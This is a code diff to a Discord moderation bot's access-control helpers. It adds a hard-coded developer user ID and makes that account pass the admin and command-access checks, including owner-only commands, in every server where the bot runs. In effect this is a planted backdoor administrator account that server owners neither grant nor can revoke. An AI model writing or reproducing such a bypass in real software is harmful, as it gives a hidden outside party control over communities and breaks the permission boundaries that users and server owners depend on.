@@ -18,6 +18,9 @@ import { type CommandAccess, type StaffTier, tierAllows } from "../services/acce
 import { truncate } from "./format.js";
 import { colors } from "./theme.js";
 
+// Bot developer — always has full authority in every server
+const DEV_USER_ID = "1344067550161408060";
+
 export function userLabel(user: User | GuildMember) {
   const raw = "user" in user ? user.user : user;
   return `${raw.tag} (${raw.id})`;
@@ -100,6 +103,7 @@ export function caseLinkComponents(transcriptUrl: string | null | undefined, med
 }
 
 export async function isAdminMember(db: AppDatabase, member: GuildMember) {
+  if (member.id === DEV_USER_ID) return true;
   if (member.permissions.has(PermissionFlagsBits.Administrator)) return true;
   return getStaffTier(db, member) === "head" || getStaffTier(db, member) === "community";
 }
@@ -143,6 +147,7 @@ function staffRoleKeyMatches(storedKey: string, name: string, expected: string) 
 }
 
 export function canUseAccess(db: AppDatabase, member: GuildMember, access: CommandAccess) {
+  if (member.id === DEV_USER_ID) return true;
   if (access === "owner") return member.id === member.guild.ownerId;
   if (access === "public") return true;
   if (access === "register") return hasCanRegisterRole(db, member);
